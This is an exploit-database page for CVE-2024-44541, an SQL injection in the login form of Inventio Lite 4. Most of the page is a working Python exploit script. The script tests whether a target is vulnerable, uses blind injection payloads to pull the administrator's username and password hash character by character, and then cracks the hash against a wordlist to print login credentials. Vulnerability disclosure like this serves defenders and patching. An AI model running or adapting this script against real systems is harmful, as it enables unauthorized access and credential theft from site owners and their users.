---
title: Inventio Lite 4 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025050009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:10.371378
---

# Inventio Lite 4 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Inventio Lite 4 SQL Injection** **2025.05.01**  Credit:  **[pointedsec](https://cxsecurity.com/author/pointedsec/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-44541](https://cxsecurity.com/cveshow/CVE-2024-44541/ "Click to see CVE-2024-44541")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Inventio Lite 4 - SQL Injection
Error Based SQLi in "username" parameter on "/?action=processlogin."
# Date: 08/21/2024
# Exploit Author: pointedsec
# Vendor Homepage: http://evilnapsis.com
# Software Link: https://github.com/evilnapsis/inventio-lite
# Version: < 4
# Tested on: Linux, Windows
# CVE : CVE-2024-44541
# This scripts exploit this vulnerability, extracting the hashes from database and tries to decrypt it.
# The passwords are hashed like this: $pass = sha1(md5($\_POST['password']));
import requests
import signal
from pwn import \*
BASE\_URL = "http://192.168.1.51/inventio-lite/"
PWD\_DIC\_PATH = "/usr/share/wordlists/rockyou.txt"
LOGIN\_ACTION = BASE\_URL + "?action=processlogin"
# Handling Ctrl + C
def def\_handler(x,y):
log.failure("Quitting...")
exit(1)
signal.signal(signal.SIGINT, def\_handler)
def is\_vulnerable():
log.info("Checking if target is vulnerable")
payload = {
"username": "\") \"",
"password": "\") \""
}
r = requests.post(LOGIN\_ACTION, data=payload)
if (r.status\_code != 200 or "Uncaught mysqli\_sql\_exception" in r.text):
return True
else:
return False
def get\_administrator\_hash(username):
prog\_hash = log.progress("Extracting Admin Password Hash")
replace\_payload = "\") or username LIKE '<USER>' or email LIKE '<USER>' and password LIKE '<STR>%' and is\_admin=1 LIMIT 1-- -".replace("<USER>", username)
characters = "abcdefghijklmnopqrstuvwxyz0123456789" # SHA(MD5(PASSWORD)) so there are no symbols and no uppercases
admin\_hash = ""
while True:
found\_char = False
for char in characters:
payload = {
"username": replace\_payload.replace("<STR>", admin\_hash + char),
"password": "blablablbalbablalba123@"
}
try:
r = requests.post(LOGIN\_ACTION, data=payload)
r.raise\_for\_status()
except requests.RequestException as e:
log.error(f"Request failed: {e}")
continue
if "<script>window.location='index.php?view=home';</script>" in r.text:
admin\_hash += char
prog\_hash.status("-> %s" % admin\_hash)
found\_char = True
break
if not found\_char:
break
prog\_hash.status("Final Admin Hash: %s" % admin\_hash)
return admin\_hash
def get\_administrator\_username():
prog\_username = log.progress("Extracting Username")
replace\_payload = "\") or username like '<STR>%' or email like '<STR>%' and is\_admin=1 LIMIT 1-- -"
characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@."
username = ""
while True:
found\_char = False
for char in characters:
payload = {
"username": replace\_payload.replace("<STR>", username + char),
"password": "blablablablbalbla123@"
}
r = requests.post(LOGIN\_ACTION, data=payload)
if "<script>window.location='index.php?view=home';</script>" in r.text:
username += char
prog\_username.status("-> %s" % username)
found\_char = True
break
if not found\_char:
break
return username
def decrypt\_password(admin\_hash):
# Encryption is SHA1(MD5(PWD))
with open(PWD\_DIC\_PATH) as password\_file:
for password in password\_file:
password = password.strip()
md5\_hash = hashlib.md5(password.encode()).hexdigest()
sha1\_hash = hashlib.sha1(md5\_hash.encode()).hexdigest()
if sha1\_hash == admin\_hash:
return password
log.error("Password not found in the dictionary.")
return None
if \_\_name\_\_ == "\_\_main\_\_":
# Check if target is vulnerable
if not is\_vulnerable():
log.failure("Target not Vulnerable...")
exit(1)
log.success("Target Vulnerable!")
log.info("Dumping Administrator username...")
admin\_username = get\_administrator\_username()
admin\_hash = get\_administrator\_hash(admin\_username)
pwd = decrypt\_password(admin\_hash)
log.success(f"Password Decrypted! -> {admin\_username}:{pwd}")
log.info("Try to Log In with that username, if that doesn't work, try with some uppercase/lowercase combinations")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top